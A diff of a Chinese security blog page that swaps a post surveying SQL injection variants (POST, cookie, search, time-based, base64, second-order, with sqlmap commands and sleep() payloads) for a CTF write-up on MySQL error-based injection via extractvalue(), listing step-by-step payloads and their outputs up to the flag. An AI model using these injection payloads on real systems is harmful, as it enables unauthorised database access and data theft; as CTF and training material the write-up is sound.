@@ -108,18 +108,18 @@
 
 
 
-  <meta name="description" content="其他注入类型提交方式注入常见的提交方式：GET、POST、COOKIE、HEAD、PUT、OPTION； 之前的基本上都是GET注入，通过url进行传参；">
+  <meta name="description" content="mysql显错注入基本原理显粗注入的原理很简单，就是将需要的数据库信息写在查询语句中，故意使语句报错，在报错结果中泄露出相应信息。">
 <meta name="keywords" content="sql注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="其他类型注入">
-<meta property="og:url" content="https://bookchi.github.io/2019/03/27/其他类型注入/index.html">
+<meta property="og:title" content="mysql显错注入">
+<meta property="og:url" content="https://bookchi.github.io/2019/03/29/mysql显错注入/index.html">
 <meta property="og:site_name" content="fuubar2">
-<meta property="og:description" content="其他注入类型提交方式注入常见的提交方式：GET、POST、COOKIE、HEAD、PUT、OPTION； 之前的基本上都是GET注入，通过url进行传参；">
+<meta property="og:description" content="mysql显错注入基本原理显粗注入的原理很简单，就是将需要的数据库信息写在查询语句中，故意使语句报错，在报错结果中泄露出相应信息。">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-03-27T15:04:19.019Z">
+<meta property="og:updated_time" content="2019-03-29T09:09:36.408Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="其他类型注入">
-<meta name="twitter:description" content="其他注入类型提交方式注入常见的提交方式：GET、POST、COOKIE、HEAD、PUT、OPTION； 之前的基本上都是GET注入，通过url进行传参；">
+<meta name="twitter:title" content="mysql显错注入">
+<meta name="twitter:description" content="mysql显错注入基本原理显粗注入的原理很简单，就是将需要的数据库信息写在查询语句中，故意使语句报错，在报错结果中泄露出相应信息。">
 
 
 
@@ -128,7 +128,7 @@
 
 
 
-  <link rel="canonical" href="https://bookchi.github.io/2019/03/27/其他类型注入/"/>
+  <link rel="canonical" href="https://bookchi.github.io/2019/03/29/mysql显错注入/"/>
 
 
 
@@ -138,7 +138,7 @@
   };
 </script>
 
-  <title>其他类型注入 | fuubar2</title>
+  <title>mysql显错注入 | fuubar2</title>
   
 
 
@@ -300,7 +300,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://bookchi.github.io/2019/03/27/其他类型注入/">
+    <link itemprop="mainEntityOfPage" href="https://bookchi.github.io/2019/03/29/mysql显错注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="fuubar">
@@ -317,7 +317,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">其他类型注入
+          <h1 class="post-title" itemprop="name headline">mysql显错注入
               
             
           </h1>
@@ -342,7 +342,7 @@
                 
               
 
-              <time title="Created: 2019-03-27 23:01:09 / Modified: 23:04:19" itemprop="dateCreated datePublished" datetime="2019-03-27T23:01:09+08:00">2019-03-27</time>
+              <time title="Created: 2019-03-29 16:37:30 / Modified: 17:09:36" itemprop="dateCreated datePublished" datetime="2019-03-29T16:37:30+08:00">2019-03-29</time>
             
 
             
@@ -405,103 +405,45 @@
       
 
       
-        <h3 id="其他注入类型"><a href="#其他注入类型" class="headerlink" title="其他注入类型"></a>其他注入类型</h3><h4 id="提交方式注入"><a href="#提交方式注入" class="headerlink" title="提交方式注入"></a>提交方式注入</h4><p>常见的提交方式：GET、POST、COOKIE、HEAD、PUT、OPTION；</p>
-<p>之前的基本上都是GET注入，通过url进行传参；</p>
+        <h3 id="mysql显错注入"><a href="#mysql显错注入" class="headerlink" title="mysql显错注入"></a>mysql显错注入</h3><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>显粗注入的原理很简单，就是将需要的数据库信息写在查询语句中，故意使语句报错，在报错结果中泄露出相应信息。</p>
 <a id="more"></a>
+<h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p>显错注入有很多种类型，这里主要以extractvalue()和updatexml()为例。</p>
+<h5 id="extractvalue-xml-frag-xpath-expr"><a href="#extractvalue-xml-frag-xpath-expr" class="headerlink" title="extractvalue(xml_frag, xpath_expr)"></a>extractvalue(<em>xml_frag</em>, <em>xpath_expr)</em></h5><p>该函数主要用于xml的提取，第一个参数是xml文本，第二个参数是xpath路径。通过下面的例子基本可以理解其用法：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="string">'&lt;a&gt;&lt;b&gt;1&lt;/b&gt;&lt;/a&gt;'</span>, <span class="string">'/a/b'</span>);</span><br><span class="line"># 查询结果应该为1</span><br></pre></td></tr></table></figure>
+<h5 id="updatexml-xml-taget-xpath-expr-new-xml"><a href="#updatexml-xml-taget-xpath-expr-new-xml" class="headerlink" title="updatexml(xml_taget, xpath_expr, new_xml)"></a>updatexml(xml_taget, xpath_expr, new_xml)</h5><p>该函数用于xml特定位置的更新，第一个参数为旧xml文本，第二个参数是xpath路径，第三个参数为要更新为的xml。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> updatexml(<span class="string">'&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;'</span>, <span class="string">'/a'</span>, <span class="string">'&lt;e&gt;fff&lt;/e&gt;'</span>)</span><br><span class="line"># 结果为&lt;e&gt;fff&lt;/e&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> UpdateXML(<span class="string">'&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;'</span>, <span class="string">'//b'</span>, <span class="string">'&lt;e&gt;fff&lt;/e&gt;'</span>)</span><br><span class="line"># 结果为&lt;a&gt;&lt;e&gt;fff&lt;/e&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>使用以上两个函数时，主要是把要获取的信息卸载xpath的地方，是xpath语法报错，从而获得所需信息。</p>
+<h4 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h4><p>以<a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">‘显错注入’</a>题目为例。该题目需要使用<code>post</code>方法提交表单，并且过滤了一些字符，这里不再赘述，重点来看显错注入。</p>
 <ul>
-<li><p>post注入</p>
-<p>后台登录的时候，常用到post提交； </p>
-<p><strong>位置：</strong>设置密保手机/邮箱、修改信息等；</p>
-<p>post是通过表单传参；</p>
-<p>有时候前端处理了报错信息，通过bp抓包就可以看到报错信息了。</p>
-<h5 id="怎么测？"><a href="#怎么测？" class="headerlink" title="怎么测？"></a>怎么测？</h5><p>post发两个包，第一个包没有注入，可能第二个包就有注入了；</p>
-<ul>
-<li><p>工具注</p>
-<p>可以使用sqlmap或者穿山甲进行注入；sqlmap可以和burpsuite联合使用；</p>
-<p>不同cms的post注入</p>
+<li><p>首先我们可以试着获取当前用户名</p>
+<p>输入：<code>username=1&#39; or extractvalue/*&amp;password=1*/(1, concat(0x7e, user())) or &#39;</code></p>
+<p>显示<code>XPATH syntax error: &#39;~web8@localhost&#39;</code>，这样就获得了用户名。</p>
 </li>
-<li><p>并不是一定在参数的地方；%5B和%5D[]这两个括号之间；</p>
-<p>==把语句加在[]之间==，要url转码注入才可以；</p>
-<p>sqlmap的话，把包复制过去，在%5D前面加*，sqlmap就会在这里注入。</p>
-<blockquote>
-<p>并不是说只在姓名那边有注入，一般管理员写的代码有一定的模式，类似的地方可能都是那么闭合的不要只是单纯的看参数的地方</p>
-<p>(织梦的0day很值钱？)看一下之前爆出来的漏洞在哪里，推测还有哪里可能存在；</p>
-</blockquote>
-<p>xdcms</p>
+<li><p>获取数据库名</p>
+<p><code>username=1&#39; or extractvalue/*&amp;password=1*/(1, concat(0x7e, database())) or &#39;</code></p>
+<p>显示<code>XPATH syntax error: &#39;~error_based_hpf&#39;</code></p>
+<p>得到数据库名为error_based_hpf。</p>
 </li>
-</ul>
+<li><p>获取表名</p>
+<p>输入：<code>username=1&#39; or extractvalue/*&amp;password=1*/(1, concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp &#39;error_based_hpf&#39;))) or &#39;</code></p>
+<p>显示：<code>XPATH syntax error: &#39;~ffll44jj,users&#39;</code></p>
+<p>得到了两个表：ffll44jj和users</p>
 </li>
-<li><p>post注入利用工具</p>
-<p>穿山甲，sqlmap，手工</p>
-<p><code>sqlmap -u url --data &#39;username=admin&amp;passwd=admin&#39;</code></p>
+<li><p>获取列名</p>
+<p>我们就先查询表ffll44jj的列，如果没有flag再去查询users。</p>
+<p>输入：<code>username=1&#39; or extractvalue/*&amp;password=1*/(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name regexp &#39;ffll44jj&#39;))) or &#39;</code></p>
+<p>显示：<code>XPATH syntax error: &#39;~value&#39;</code></p>
 </li>
-<li><p>cookie注入</p>
-<p>有时get会有防注入，但是cookie可能没有被重视，那我攻击你的cookie;</p>
-<ul>
-<li>使用sqlmap来进行cookie注入：</li>
-</ul>
-<p><code>sqlmap -u http://127.0.0.1:8080 --cookie &quot;id=1&quot; --level 2</code> </p>
-<ul>
-<li><p>手工</p>
-<p>就是把注入语句放到cookie里提交，instead of url；</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 清空地址栏，输入</span><br><span class="line">javascript:alert(document.cookie="id="+escape("30and 1=1"))</span><br><span class="line"># 然后去掉 ?id=1553输入http://soft.XXX.edu.cn/list.asp返回正常</span><br></pre></td></tr></table></figure>
+<li><p>获取flag</p>
+<p>有了表名和列名以后，直接查询列的值。</p>
+<p>输入：<code>username=1&#39; or extractvalue/*&amp;password=1*/(1, concat(0x7e,(select value from ffll44jj))) or &#39;</code></p>
+<p>显示：<code>XPATH syntax error: &#39;~flag{err0r_b4sed_sqli_+_hpf}&#39;</code></p>
+<p>这样我们就获得了flag：flag{err0r_b4sed_sqli_+_hpf}。</p>
 </li>
 </ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie中转？？？？</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><em>cookie是个啥提交玩意？是在cookie里面注入吗？怎么注入？</em></p>
-<p>​    - 就是直接修改cookie的值，加入sql语句之类的</p>
-</blockquote>
-<h4 id="参数型注入"><a href="#参数型注入" class="headerlink" title="参数型注入"></a>参数型注入</h4><ul>
-<li><p>数字类型注入</p>
-</li>
-<li><p>字符类型注入</p>
-<p>以上两者就是get注入，只是参数的类型不一样；字符型的需要闭合引号；</p>
-</li>
-<li><p>搜索型注入</p>
-<p>搜索框这个位置存在注入；</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2%'and 1=1 and '%'='	# 返回和单独输入2是一样的页面</span><br><span class="line">2%'and 1=2 and '%'='	# 返回不同</span><br></pre></td></tr></table></figure>
-<p>因为要闭合比较麻烦，先用bp抓包，再用sqlmap来跑；</p>
-</li>
-</ul>
-<h4 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h4><ol>
-<li><p>伪静态注入</p>
-<p>看上去是一个html静态页面，实际上有动态的内容；</p>
-<p>爬站or目录扫描；</p>
-</li>
-<li><p>延迟注入</p>
-<p>什么是延迟注入？用页面延迟代替显错；</p>
-<blockquote>
-<p>如果满足某个条件，就延迟显示；</p>
-</blockquote>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and sleep(5);  //延迟5s返回，说明存在延迟注入； 那又怎样?是说明这个地方有注入吗？</span><br><span class="line"><span class="comment">/* mysql&lt;=5.0 benchmark(n,sql) */</span></span><br><span class="line"></span><br><span class="line">and if(true,sleep(5),0); ==IF(1=1,true,false);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果当前用户数是root，就延迟5s */</span></span><br><span class="line">and if(substring(user(),1,4)='root',sleep(5),1)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>base64注入</p>
-<blockquote>
-<p>什么时候需要base64编码注入？</p>
-<p>​    - 比如某个关键字被过滤，并且防御机制中有base64解码</p>
-</blockquote>
-<p>比如<code>MsdjksoLSKssmmWqef==</code></p>
-<p>使用sqlmap进行注入：<code>sqlmap -u http://xxxxx?id=1 --tamper</code></p>
-</li>
-<li><p>二阶注入</p>
-<p>一阶注入：提交语句，就返回结果；</p>
-<p>二阶注入：要两次攻击才能完成的；1）插入 2）执行，回显</p>
-<blockquote>
-<p>74cms人才系统存在二阶注入<code>aa&#39;, fullname=user()#</code></p>
-<p>​    首先把这句话插入数据库，然后数据库调用，回显</p>
-</blockquote>
-</li>
-<li><p>phpv9 authkey注入</p>
-<p>类似一个中转注入；用工具Havij速度会很快；</p>
-</li>
-<li><p>http头注入</p>
-</li>
-<li><p>xml实体注入</p>
-</li>
-</ol>
+<p>以上的注入都是使用了extractvalue()函数，updatexml()与之类似，只是需要多加一个参数而已。</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>mysql的报错注入只是mysql注入的其中一种类型。mysql报错注入又有很多类型，这里只简单介绍了使用extractvalue()和updatevalue()来进行报错注入。</p>
+<p>更多显错注入可以参考<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">十种MySQL报错注入</a>。</p>
 
       
     </div>
@@ -521,12 +463,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/2019/03/27/其他类型注入/">其他类型注入</a></p>
+  <p><span>本文标题:</span><a href="/2019/03/29/mysql显错注入/">mysql显错注入</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 fuubar 的个人博客">fuubar</a></p>
-  <p><span>发布时间:</span>2019年03月27日 - 23:03</p>
-  <p><span>最后更新:</span>2019年03月27日 - 23:03</p>
-  <p><span>原始链接:</span><a href="/2019/03/27/其他类型注入/" title="其他类型注入">https://bookchi.github.io/2019/03/27/其他类型注入/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://bookchi.github.io/2019/03/27/其他类型注入/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年03月29日 - 16:03</p>
+  <p><span>最后更新:</span>2019年03月29日 - 17:03</p>
+  <p><span>原始链接:</span><a href="/2019/03/29/mysql显错注入/" title="mysql显错注入">https://bookchi.github.io/2019/03/29/mysql显错注入/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://bookchi.github.io/2019/03/29/mysql显错注入/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -570,8 +512,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/26/Web缓存欺骗攻击/" rel="next" title="Web缓存欺骗攻击">
-                <i class="fa fa-chevron-left"></i> Web缓存欺骗攻击
+              <a href="/2019/03/27/其他类型注入/" rel="next" title="其他类型注入">
+                <i class="fa fa-chevron-left"></i> 其他类型注入
               </a>
             
           </div>
@@ -579,10 +521,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/29/mysql显错注入/" rel="prev" title="mysql显错注入">
-                mysql显错注入 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -735,7 +673,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#其他注入类型"><span class="nav-number">1.</span> <span class="nav-text">其他注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#提交方式注入"><span class="nav-number">1.1.</span> <span class="nav-text">提交方式注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#怎么测？"><span class="nav-number">1.1.1.</span> <span class="nav-text">怎么测？</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参数型注入"><span class="nav-number">1.2.</span> <span class="nav-text">参数型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他注入"><span class="nav-number">1.3.</span> <span class="nav-text">其他注入</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql显错注入"><span class="nav-number">1.</span> <span class="nav-text">mysql显错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基本原理"><span class="nav-number">1.1.</span> <span class="nav-text">基本原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备知识"><span class="nav-number">1.2.</span> <span class="nav-text">预备知识</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#extractvalue-xml-frag-xpath-expr"><span class="nav-number">1.2.1.</span> <span class="nav-text">extractvalue(xml_frag, xpath_expr)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#updatexml-xml-taget-xpath-expr-new-xml"><span class="nav-number">1.2.2.</span> <span class="nav-text">updatexml(xml_taget, xpath_expr, new_xml)</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#显错注入"><span class="nav-number">1.3.</span> <span class="nav-text">显错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#总结"><span class="nav-number">1.4.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
             
 
           </div>
